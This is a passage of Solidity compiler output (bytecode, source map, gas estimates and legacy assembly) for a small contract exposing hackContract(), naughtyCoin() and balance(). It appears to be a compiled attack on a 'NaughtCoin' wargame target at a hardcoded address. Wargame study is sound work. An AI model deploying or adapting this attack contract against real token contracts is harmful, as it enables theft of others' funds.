DUP2 PUSH2 0x4AE JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x3D4 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x392 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x60 DUP3 ADD SWAP1 POP PUSH2 0x3EF PUSH1 0x0 DUP4 ADD DUP7 PUSH2 0x392 JUMP JUMPDEST PUSH2 0x3FC PUSH1 0x20 DUP4 ADD DUP6 PUSH2 0x392 JUMP JUMPDEST PUSH2 0x409 PUSH1 0x40 DUP4 ADD DUP5 PUSH2 0x3B0 JUMP JUMPDEST SWAP5 SWAP4 POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 DUP3 ADD SWAP1 POP PUSH2 0x426 PUSH1 0x0 DUP4 ADD DUP6 PUSH2 0x392 JUMP JUMPDEST PUSH2 0x433 PUSH1 0x20 DUP4 ADD DUP5 PUSH2 0x3B0 JUMP JUMPDEST SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x44F PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x3A1 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x46A PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x3B0 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x47B DUP3 PUSH2 0x48E JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x4C3 DUP3 PUSH2 0x4CA JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x4D5 DUP3 PUSH2 0x48E JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x4E5 DUP2 PUSH2 0x482 JUMP JUMPDEST DUP2 EQ PUSH2 0x4F0 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH2 0x4FC DUP2 PUSH2 0x4AE JUMP JUMPDEST DUP2 EQ PUSH2 0x507 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 PUSH27 0x32175784B7F2AADD0F0D263EF2C80870A1533CB03323E173AEFA95 PUSH6 0x9D981F64736F PUSH13 0x63430008000033000000000000 ",
							"sourceMap": "116:563:1:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;136:25;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;460:210;;;:::i;:::-;;321:133;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;136:25;;;;;;;;;;;;:::o;460:210::-;502:13;518:9;:7;:9::i;:::-;502:25;;538:11;;;;;;;;;;:19;;;566:4;573:8;538:44;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;593:11;;;;;;;;;;:24;;;618:8;;;;;;;;;;;636:4;643:8;593:59;;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;460:210;:::o;321:133::-;361:4;377:11;391;;;;;;;;;;:21;;;413:8;;;;;;;;;;;391:31;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;377:45;;440:6;433:13;;;321:133;:::o;7:137:2:-;;92:6;86:13;77:22;;108:30;132:5;108:30;:::i;:::-;67:77;;;;:::o;150:143::-;;238:6;232:13;223:22;;254:33;281:5;254:33;:::i;:::-;213:80;;;;:::o;299:278::-;;415:2;403:9;394:7;390:23;386:32;383:2;;;431:1;428;421:12;383:2;474:1;499:61;552:7;543:6;532:9;528:22;499:61;:::i;:::-;489:71;;445:125;373:204;;;;:::o;583:284::-;;702:2;690:9;681:7;677:23;673:32;670:2;;;718:1;715;708:12;670:2;761:1;786:64;842:7;833:6;822:9;818:22;786:64;:::i;:::-;776:74;;732:128;660:207;;;;:::o;873:118::-;960:24;978:5;960:24;:::i;:::-;955:3;948:37;938:53;;:::o;997:157::-;1097:50;1141:5;1097:50;:::i;:::-;1092:3;1085:63;1075:79;;:::o;1160:118::-;1247:24;1265:5;1247:24;:::i;:::-;1242:3;1235:37;1225:53;;:::o;1284:222::-;;1415:2;1404:9;1400:18;1392:26;;1428:71;1496:1;1485:9;1481:17;1472:6;1428:71;:::i;:::-;1382:124;;;;:::o;1512:442::-;;1699:2;1688:9;1684:18;1676:26;;1712:71;1780:1;1769:9;1765:17;1756:6;1712:71;:::i;:::-;1793:72;1861:2;1850:9;1846:18;1837:6;1793:72;:::i;:::-;1875;1943:2;1932:9;1928:18;1919:6;1875:72;:::i;:::-;1666:288;;;;;;:::o;1960:332::-;;2119:2;2108:9;2104:18;2096:26;;2132:71;2200:1;2189:9;2185:17;2176:6;2132:71;:::i;:::-;2213:72;2281:2;2270:9;2266:18;2257:6;2213:72;:::i;:::-;2086:206;;;;;:::o;2298:248::-;;2442:2;2431:9;2427:18;2419:26;;2455:84;2536:1;2525:9;2521:17;2512:6;2455:84;:::i;:::-;2409:137;;;;:::o;2552:222::-;;2683:2;2672:9;2668:18;2660:26;;2696:71;2764:1;2753:9;2749:17;2740:6;2696:71;:::i;:::-;2650:124;;;;:::o;2780:96::-;;2846:24;2864:5;2846:24;:::i;:::-;2835:35;;2825:51;;;:::o;2882:90::-;;2959:5;2952:13;2945:21;2934:32;;2924:48;;;:::o;2978:126::-;;3055:42;3048:5;3044:54;3033:65;;3023:81;;;:::o;3110:77::-;;3176:5;3165:16;;3155:32;;;:::o;3193:152::-;;3289:50;3333:5;3289:50;:::i;:::-;3276:63;;3266:79;;;:::o;3351:126::-;;3447:24;3465:5;3447:24;:::i;:::-;3434:37;;3424:53;;;:::o;3483:116::-;3553:21;3568:5;3553:21;:::i;:::-;3546:5;3543:32;3533:2;;3589:1;3586;3579:12;3533:2;3523:76;:::o;3605:122::-;3678:24;3696:5;3678:24;:::i;:::-;3671:5;3668:35;3658:2;;3717:1;3714;3707:12;3658:2;3648:79;:::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "268800",
								"executionCost": "infinite",
								"totalCost": "infinite"
							},
							"external": {
								"balance()": "infinite",
								"hackContract()": "infinite",
								"naughtyCoin()": "1232"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 116,
									"end": 679,
									"name": "PUSH",
									"source": 1,
									"value": "80"
								},
								{
									"begin": 116,
									"end": 679,
									"name": "PUSH",
									"source": 1,
									"value": "40"
								},
								{
									"begin": 116,
									"end": 679,
									"name": "MSTORE",
									"source": 1
								},
								{
									"begin": 187,
									"end": 229,
									"name": "PUSH",
									"source": 1,
									"value": "DB01D94217308046A792D864B16A35837AA52B86"
								},
								{
									"begin": 168,
									"end": 229,
									"name": "PUSH",
									"source": 1,
									"value": "1"
								},
								{
									"begin": 168,
									"end": 229,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 168,
									"end": 229,
									"name": "PUSH",
									"source": 1,
									"value": "100"
								},
								{
									"begin": 168,
									"end": 229,
									"name": "EXP",
									"source": 1
								},
								{
									"begin": 168,
									"end": 229,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 168,
									"end": 229,
									"name": "SLOAD",
									"source": 1
								},
								{
									"begin": 168,
									"end": 229,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 168,
									"end": 229,
									"name": "PUSH",
									"source": 1,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 168,
									"end": 229,
									"name": "MUL",
									"source": 1
								},
								{
									"begin": 168,
									"end": 229,
									"name": "NOT",
									"source": 1
								},
								{
									"begin": 168,
									"end": 229,
									"name": "AND",
									"source": 1
								},
								{
									"begin": 168,
									"end": 229,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 168,
									"end": 229,
									"name": "DUP4",
									"source": 1
								},
								{
									"begin": 168,
									"end": 229,
									"name": "PUSH",
									"source": 1,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 168,
									"end": 229,
									"name": "AND",
									"source": 1
								},
								{
									"begin": 168,
									"end": 229,
									"name": "MUL",
									"source": 1
								},
								{
									"begin": 168,
									"end": 229,
									"name": "OR",
									"source": 1
								},
								{
									"begin": 168,
									"end": 229,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 168,
									"end": 229,
									"name": "SSTORE",
									"source": 1
								},
								{
									"begin": 168,
									"end": 229,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 236,
									"end": 315,
									"name": "CALLVALUE",
									"source": 1
								},
								{
									"begin": 236,
									"end": 315,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 236,
									"end": 315,
									"name": "ISZERO",
									"source": 1
								},
								{
									"begin": 236,
									"end": 315,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "1"
								},
								{
									"begin": 236,
									"end": 315,
									"name": "JUMPI",
									"source": 1
								},
								{
									"begin": 236,
									"end": 315,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 236,
									"end": 315,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 236,
									"end": 315,
									"name": "REVERT",
									"source": 1
								},
								{
									"begin": 236,
									"end": 315,
									"name": "tag",
									"source": 1,
									"value": "1"
								},
								{
									"begin": 236,
									"end": 315,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 236,
									"end": 315,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 236,
									"end": 315,
									"name": "PUSH",
									"source": 1,
									"value": "40"
								},
								{
									"begin": 236,
									"end": 315,
									"name": "MLOAD",
									"source": 1
								},
								{
									"begin": 236,
									"end": 315,
									"name": "PUSHSIZE",
									"source": 1
								},
								{
									"begin": 236,
									"end": 315,
									"name": "CODESIZE",
									"source": 1
								},
								{
									"begin": 236,
									"end": 315,
									"name": "SUB",
									"source": 1
								},
								{
									"begin": 236,
									"end": 315,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 236,
									"end": 315,
									"name": "PUSHSIZE",
									"source": 1
								},
								{
									"begin": 236,
									"end": 315,
									"name": "DUP4",
									"source": 1
								},
								{
									"begin": 236,
									"end": 315,
									"name": "CODECOPY",
									"source": 1
								},
								{
									"begin": 236,
									"end": 315,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 236,
									"end": 315,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 236,
									"end": 315,
									"name": "ADD",
									"source": 1
								},
								{
									"begin": 236,
									"end": 315,
									"name": "PUSH",
									"source": 1,
									"value": "40"
								},
								{
									"begin": 236,
									"end": 315,
									"name": "MSTORE",
									"source": 1
								},
								{
									"begin": 236,
									"end": 315,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 236,
									"end": 315,
									"name": "ADD",
									"source": 1
								},
								{
									"begin": 236,
									"end": 315,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 236,
									"end": 315,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "2"
								},
								{
									"begin": 236,
									"end": 315,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 236,
									"end": 315,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 236,
									"end": 315,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "3"
								},
								{
									"begin": 236,
									"end": 315,
									"name": "JUMP",
									"source": 1,
									"value": "[in]"
								},
								{
									"begin": 236,
									"end": 315,
									"name": "tag",
									"source": 1,
									"value": "2"
								},
								{
									"begin": 236,
									"end": 315,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 298,
									"end": 306,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 277,
									"end": 288,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 277,
									"end": 288,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 277,
									"end": 307,
									"name": "PUSH",
									"source": 1,
									"value": "100"
								},
								{
									"begin": 277,
									"end": 307,
									"name": "EXP",
									"source": 1
								},
								{
									"begin": 277,
									"end": 307,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 277,
									"end": 307,
									"name": "SLOAD",
									"source": 1
								},
								{
									"begin": 277,
									"end": 307,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 277,
									"end": 307,
									"name": "PUSH",
									"source": 1,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 277,
									"end": 307,
									"name": "MUL",
									"source": 1
								},
								{
									"begin": 277,
									"end": 307,
									"name": "NOT",
									"source": 1
								},
								{
									"begin": 277,
									"end": 307,
									"name": "AND",
									"source": 1
								},
								{
									"begin": 277,
									"end": 307,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 277,
									"end": 307,
									"name": "DUP4",
									"source": 1
								},
								{
									"begin": 277,
									"end": 307,
									"name": "PUSH",
									"source": 1,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 277,
									"end": 307,
									"name": "AND",
									"source": 1
								},
								{
									"begin": 277,
									"end": 307,
									"name": "MUL",
									"source": 1
								},
								{
									"begin": 277,
									"end": 307,
									"name": "OR",
									"source": 1
								},
								{
									"begin": 277,
									"end": 307,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 277,
									"end": 307,
									"name": "SSTORE",
									"source": 1
								},
								{
									"begin": 277,
									"end": 307,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 236,
									"end": 315,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 116,
									"end": 679,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "6"
								},
								{
									"begin": 116,
									"end": 679,
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 7,
									"end": 150,
									"name": "tag",
									"source": 2,
									"value": "8"
								},
								{
									"begin": 7,
									"end": 150,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 7,
									"end": 150,
									"name": "PUSH",
									"source": 2,
									"value": "0"
								},
								{
									"begin": 95,
									"end": 101,
									"name": "DUP2",
									"source": 2
								},
								{
									"begin": 89,
									"end": 102,
									"name": "MLOAD",
									"source": 2
								},
								{
									"begin": 80,
									"end": 102,
									"name": "SWAP1",
									"source": 2
								},
								{
									"begin": 80,
									"end": 102,
									"name": "POP",
									"source": 2
								},
								{
									"begin": 111,
									"end": 144,
									"name": "PUSH [tag]",
									"source": 2,
									"value": "10"
								},
								{
									"begin": 138,
									"end": 143,
									"name": "DUP2",
									"source": 2
								},
								{
									"begin": 111,
									"end": 144,
									"name": "PUSH [tag]",
									"source": 2,
									"value": "11"
								},
								{
									"begin": 111,
									"end": 144,
									"name": "JUMP",
									"source": 2,
									"value": "[in]"
								},
								{
									"begin": 111,
									"end": 144,
									"name": "tag",
									"source": 2,
									"value": "10"
								},
								{
									"begin": 111,
									"end": 144,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 70,
									"end": 150,
									"name": "SWAP3",
									"source": 2
								},
								{
									"begin": 70,
									"end": 150,
									"name": "SWAP2",
									"source": 2
								},
								{
									"begin": 70,
									"end": 150,
									"name": "POP",
									"source": 2
								},
								{
									"begin": 70,
									"end": 150,
									"name": "POP",
									"source": 2
								},
								{
									"begin": 70,
									"end": 150,
									"name": "JUMP",
									"source": 2,
									"value": "[out]"
								},
								{
									"begin": 156,
									"end": 440,
									"name": "tag",
									"source": 2,
									"value": "3"
								},
								{
									"begin": 156,
									"end": 440,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 156,
									"end": 440,
									"name": "PUSH",
									"source": 2,
									"value": "0"
								},
								{
									"begin": 275,
									"end": 277,
									"name": "PUSH",
									"source": 2,
									"value": "20"
								},
								{
									"begin": 263,
									"end": 272,
									"name": "DUP3",
									"source": 2
								},
								{
									"begin": 254,
									"end": 261,
									"name": "DUP5",
									"source": 2
								},
								{
									"begin": 250,
									"end": 273,
									"name": "SUB",
									"source": 2
								},
								{
									"begin": 246,
									"end": 278,
									"name": "SLT",
									"source": 2
								},
								{
									"begin": 243,
									"end": 245,
									"name": "ISZERO",
									"source": 2
								},
								{
									"begin": 243,
									"end": 245,
									"name": "PUSH [tag]",
									"source": 2,
									"value": "13"
								},
								{
									"begin": 243,
									"end": 245,
									"name": "JUMPI",
									"source": 2
								},
								{
									"begin": 291,
									"end": 292,
									"name": "PUSH",
									"source": 2,
									"value": "0"
								},
								{
									"begin": 288,
									"end": 289,
									"name": "DUP1",
									"source": 2
								},
								{
									"begin": 281,
									"end": 293,
									"name": "REVERT",
									"source": 2
								},
								{
									"begin": 243,
									"end": 245,
									"name": "tag",
									"source": 2,
									"value": "13"
								},
								{
									"begin": 243,
									"end": 245,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 334,
									"end": 335,
									"name": "PUSH",
									"source": 2,
									"value": "0"
								},
								{
									"begin": 359,
									"end": 423,
									"name": "PUSH [tag]",
									"source": 2,
									"value": "14"
								},
								{
									"begin": 415,
									"end": 422,
									"name": "DUP5",
									"source": 2
								},
								{
									"begin": 406,
									"end": 412,
									"name": "DUP3",
									"source": 2
								},
								{
									"begin": 395,
									"end": 404,
									"name": "DUP6",
									"source": 2
								},
								{
									"begin": 391,
									"end": 413,
									"name": "ADD",
									"source": 2
								},
								{
									"begin": 359,
									"end": 423,
									"name": "PUSH [tag]",
									"source": 2,
									"value": "8"
								},
								{
									"begin": 359,
									"end": 423,
									"name": "JUMP",
									"source": 2,
									"value": "[in]"
								},
								{
									"begin": 359,
									"end": 423,
									"name": "tag",
									"source": 2,
									"value": "14"
								},
								{
									"begin": 359,
									"end": 423,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 349,
									"end": 423,
									"name": "SWAP2",
									"source": 2
								},
								{
									"begin": 349,
									"end": 423,
									"name": "POP",
									"source": 2
								},
								{
									"begin": 305,
									"end": 433,
									"name": "POP",
									"source": 2
								},
								{
									"begin": 233,
									"end": 440,
									"name": "SWAP3",
									"source": 2
								},
								{
									"begin": 233,
									"end": 440,
									"name": "SWAP2",
									"source": 2
								},
								{
									"begin": 233,
									"end": 440,
									"name": "POP",
									"source": 2
								},
								{
									"begin": 233,
									"end": 440,
									"name": "POP",
									"source": 2
								},
								{
									"begin": 233,
									"end": 440,
									"name": "JUMP",
									"source": 2,
									"value": "[out]"
								},
								{
									"begin": 446,
									"end": 542,
									"name": "tag",
									"source": 2,
									"value": "15"
								},
								{
									"begin": 446,
									"end": 542,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 446,
									"end": 542,
									"name": "PUSH",
									"source": 2,
									"value": "0"
								},
								{
									"begin": 512,
									"end": 536,
									"name": "PUSH [tag]",
									"source": 2,
									"value": "17"
								},
								{
									"begin": 530,
									"end": 535,
									"name": "DUP3",
									"source": 2
								},
								{
									"begin": 512,
									"end": 536,
									"name": "PUSH [tag]",
									"source": 2,
									"value": "18"
								},
								{
									"begin": 512,
									"end": 536,
									"name": "JUMP",
									"source": 2,
									"value": "[in]"
								},
								{
									"begin": 512,
									"end": 536,
									"name": "tag",
									"source": 2,
									"value": "17"
								},
								{
									"begin": 512,
									"end": 536,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 501,
									"end": 536,
									"name": "SWAP1",
									"source": 2
								},
								{
									"begin": 501,
									"end": 536,
									"name": "POP",
									"source": 2
								},
								{
									"begin": 491,
									"end": 542,
									"name": "SWAP2",
									"source": 2
								},
								{
									"begin": 491,
									"end": 542,
									"name": "SWAP1",
									"source": 2
								},
								{
									"begin": 491,
									"end": 542,
									"name": "POP",
									"source": 2
								},
								{
									"begin": 491,
									"end": 542,
									"name": "JUMP",
									"source": 2,
									"value": "[out]"
								},
								{
									"begin": 548,
									"end": 674,
									"name": "tag",
									"source": 2,
									"value": "18"
								},
								{
									"begin": 548,
									"end": 674,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 548,
									"end": 674,
									"name": "PUSH",
									"source": 2,
									"value": "0"
								},
								{
									"begin": 625,
									"end": 667,
									"name": "PUSH",
									"source": 2,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 618,
									"end": 623,
									"name": "DUP3",
									"source": 2
								},
								{
									"begin": 614,
									"end": 668,
									"name": "AND",
									"source": 2
								},
								{
									"begin": 603,
									"end": 668,
									"name": "SWAP1",
									"source": 2
								},
								{
									"begin": 603,
									"end": 668,
									"name": "POP",
									"source": 2
								},
								{
									"begin": 593,
									"end": 674,
									"name": "SWAP2",
									"source": 2
								},
								{
									"begin": 593,
									"end": 674,
									"name": "SWAP1",
									"source": 2
								},
								{
									"begin": 593,
									"end": 674,
									"name": "POP",
									"source": 2
								},
								{
									"begin": 593,
									"end": 674,
									"name": "JUMP",
									"source": 2,
									"value": "[out]"
								},
								{
									"begin": 680,
									"end": 802,
									"name": "tag",
									"source": 2,
									"value": "11"
								},
								{
									"begin": 680,
									"end": 802,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 753,
									"end": 777,
									"name": "PUSH [tag]",
									"source": 2,
									"value": "21"
								},
								{
									"begin": 771,
									"end": 776,
									"name": "DUP2",
									"source": 2
								},
								{
									"begin": 753,
									"end": 777,
									"name": "PUSH [tag]",
									"source": 2,
									"value": "15"
								},
								{
									"begin": 753,
									"end": 777,
									"name": "JUMP",
									"source": 2,
									"value": "[in]"
								},
								{
									"begin": 753,
									"end": 777,
									"name": "tag",
									"source": 2,
									"value": "21"
								},
								{
									"begin": 753,
									"end": 777,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 746,
									"end": 751,
									"name": "DUP2",
									"source": 2
								},
								{
									"begin": 743,
									"end": 778,
									"name": "EQ",
									"source": 2
								},
								{
									"begin": 733,
									"end": 735,
									"name": "PUSH [tag]",
									"source": 2,
									"value": "22"
								},
								{
									"begin": 733,
									"end": 735,
									"name": "JUMPI",
									"source": 2
								},
								{
									"begin": 792,
									"end": 793,
									"name": "PUSH",
									"source": 2,
									"value": "0"
								},
								{
									"begin": 789,
									"end": 790,
									"name": "DUP1",
									"source": 2
								},
								{
									"begin": 782,
									"end": 794,
									"name": "REVERT",
									"source": 2
								},
								{
									"begin": 733,
									"end": 735,
									"name": "tag",
									"source": 2,
									"value": "22"
								},
								{
									"begin": 733,
									"end": 735,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 723,
									"end": 802,
									"name": "POP",
									"source": 2
								},
								{
									"begin": 723,
									"end": 802,
									"name": "JUMP",
									"source": 2,
									"value": "[out]"
								},
								{
									"begin": 116,
									"end": 679,
									"name": "tag",
									"source": 1,
									"value": "6"
								},
								{
									"begin": 116,
									"end": 679,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 116,
									"end": 679,
									"name": "PUSH #[$]",
									"source": 1,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 116,
									"end": 679,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 116,
									"end": 679,
									"name": "PUSH [$]",
									"source": 1,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 116,
									"end": 679,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 116,
									"end": 679,
									"name": "CODECOPY",
									"source": 1
								},
								{
									"begin": 116,
									"end": 679,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 116,
									"end": 679,
									"name": "RETURN",
									"source": 1
								}
							],
							".data": {
								"0": {
									".auxdata": "a26469706673582212207a32175784b7f2aadd0f0d263ef2c80870a1533cb03323e173aefa95659d981f64736f6c63430008000033",
									".code": [
										{
											"begin": 116,
											"end": 679,
											"name": "PUSH",
											"source": 1,
											"value": "80"
										},
										{
											"begin": 116,
											"end": 679,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 116,
											"end": 679,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 116,
											"end": 679,
											"name": "CALLVALUE",
											"source": 1
										},
										{
											"begin": 116,
											"end": 679,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 116,
											"end": 679,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 116,
											"end": 679,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "1"
										},
										{
											"begin": 116,
											"end": 679,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 116,
											"end": 679,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 116,
											"end": 679,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 116,
											"end": 679,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 116,
											"end": 679,
											"name": "tag",
											"source": 1,
											"value": "1"
										},
										{
											"begin": 116,
											"end": 679,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 116,
											"end": 679,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 116,
											"end": 679,
											"name": "PUSH",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 116,
											"end": 679,
											"name": "CALLDATASIZE",
											"source": 1
										},
										{
											"begin": 116,
											"end": 679,
											"name": "LT",
											"source": 1
										},
										{
											"begin": 116,
											"end": 679,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "2"
										},
										{
											"begin": 116,
											"end": 679,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 116,
											"end": 679,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 116,
											"end": 679,
											"name": "CALLDATALOAD",
											"source": 1
										},
										{
											"begin": 116,
											"end": 679,
											"name": "PUSH",
											"source": 1,
											"value": "E0"
										},
										{
											"begin": 116,
											"end": 679,
											"name": "SHR",
											"source": 1
										},
										{
											"begin": 116,
											"end": 679,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 116,
											"end": 679,
											"name": "PUSH",
											"source": 1,
											"value": "14F719D0"
										},
										{
											"begin": 116,
											"end": 679,
											"name": "EQ",
											"source": 1
										},
										{
											"begin": 116,
											"end": 679,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "3"
										},
										{
											"begin": 116,
											"end": 679,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 116,
											"end": 679,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 116,
											"end": 679,
											"name": "PUSH",
											"source": 1,
											"value": "7CA2474E"
										},
										{
											"begin": 116,
											"end": 679,
											"name": "EQ",
											"source": 1
										},
										{
											"begin": 116,
											"end": 679,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 116,
											"end": 679,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 116,
											"end": 679,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 116,
											"end": 679,
											"name": "PUSH",
											"source": 1,
											"value": "B69EF8A8"
										},
										{
											"begin": 116,
											"end": 679,
											"name": "EQ",
											"source": 1
										},
										{
											"begin": 116,
											"end": 679,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "5"
										},
										{
											"begin": 116,
											"end": 679,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 116,
											"end": 679,
											"name": "tag",
											"source": 1,
											"value": "2"
										},
										{
											"begin": 116,
											"end": 679,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 116,
											"end": 679,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 116,
											"end": 679,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 116,
											"end": 679,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 136,
											"end": 161,
											"name": "tag",
											"source": 1,
											"value": "3"
										},
										{
											"begin": 136,
											"end": 161,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 136,
											"end": 161,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "6"
										},
										{
											"begin": 136,
											"end": 161,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "7"
										},
										{
											"begin": 136,
											"end": 161,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 136,
											"end": 161,
											"name": "tag",
											"source": 1,
											"value": "6"
										},
										{
											"begin": 136,
											"end": 161,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 136,
											"end": 161,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 136,
											"end": 161,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 136,
											"end": 161,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "8"
										},
										{
											"begin": 136,
											"end": 161,
